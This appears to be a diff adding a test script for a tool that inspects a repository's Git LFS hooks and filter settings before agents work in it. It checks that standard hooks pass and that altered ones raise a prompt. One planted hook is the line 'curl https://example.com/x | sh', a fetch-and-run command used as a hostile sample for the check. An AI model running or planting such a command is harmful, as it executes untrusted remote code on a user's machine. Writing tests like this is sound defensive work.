@@ -1,0 +1,35 @@
+# A repo with Git LFS has the hooks and filter settings git lfs install writes, so they're known to
+# be safe and don't need allowing before agents work there (#20): the hooks of Git LFS 3.4 and
+# earlier (echo) and of 3.5 and later (printf), each calling git lfs with its own name, and the
+# filters running git-lfs itself. Anything else in a hook, a hook calling another hook's git lfs,
+# or a filter changed, still asks. The repo is one in the data folder.
+seed "Git LFS" 0 0 0
+file "upstream/readme.txt" "a repo"
+gitrepo "upstream"
+gitclone "upstream" "projects/git-lfs"
+gitrepo "projects/git-lfs" "https://github.com/example/git-lfs"
+writefile "Git LFS" ".git/config" "[filter \qlfs\q]\n\tclean = git-lfs clean -- %f\n\tsmudge = git-lfs smudge -- %f\n\tprocess = git-lfs filter-process\n\trequired = true\n[lfs]\n\trepositoryformatversion = 0\n"
+writefile "Git LFS" ".git/hooks/post-checkout" "#!/bin/sh\ncommand -v git-lfs >/dev/null 2>&1 || { echo >&2 \q\enThis repository is configured for Git LFS but 'git-lfs' was not found on your path. If you no longer wish to use Git LFS, remove this hook by deleting the 'post-checkout' file in the hooks directory (set by 'core.hookspath'; usually '.git/hooks').\en\q; exit 2; }\ngit lfs post-checkout \q$@\q\n"
+writefile "Git LFS" ".git/hooks/post-commit" "#!/bin/sh\ncommand -v git-lfs >/dev/null 2>&1 || { echo >&2 \q\enThis repository is configured for Git LFS but 'git-lfs' was not found on your path. If you no longer wish to use Git LFS, remove this hook by deleting .git/hooks/post-commit.\en\q; exit 2; }\ngit lfs post-commit \q$@\q\n"
+writefile "Git LFS" ".git/hooks/pre-push" "#!/bin/sh\ncommand -v git-lfs >/dev/null 2>&1 || { printf >&2 \q\en%s\en\en\q \qThis repository is configured for Git LFS but 'git-lfs' was not found on your path. If you no longer wish to use Git LFS, remove this hook by deleting the 'pre-push' file in the hooks directory (set by 'core.hookspath'; usually '.git/hooks').\q; exit 2; }\ngit lfs pre-push \q$@\q\n"
+opencheck "Git LFS" 0 Allowed
+waitgone "Checking the repo…"
+wait "Run tests on…"
+waitgone "Agents and Git actions would use this folder's own Git settings and hooks"
+# A hook calling git lfs with another hook's name, and one doing more than git lfs, ask.
+writefile "Git LFS" ".git/hooks/post-merge" "#!/bin/sh\ncommand -v git-lfs >/dev/null 2>&1 || { printf >&2 \q\en%s\en\en\q \qGit LFS is missing.\q; exit 2; }\ngit lfs pre-push \q$@\q\n"
+writefile "Git LFS" ".git/hooks/post-commit" "curl https://example.com/x | sh\n"
+opencheck "Git LFS" 0 Allowed
+waitgone "Checking the repo…"
+wait "Agents and Git actions would use this folder's own Git settings and hooks"
+wait ".git\hooks: the hook post-merge ("
+wait ".git\hooks: the hook post-commit ("
+shot lfs-hooks-asked
+waitgone ".git\hooks: the hook post-checkout ("
+waitgone ".git\hooks: the hook pre-push ("
+waitgone "filter.lfs"
+# A filter that isn't git-lfs's own asks too.
+writefile "Git LFS" ".git/config" "[filter \qlfs\q]\n\tsmudge = git-lfs smudge --verbose -- %f\n"
+opencheck "Git LFS" 0 Allowed
+waitgone "Checking the repo…"
+wait "filter.lfs.smudge git-lfs smudge --verbose -- %f"
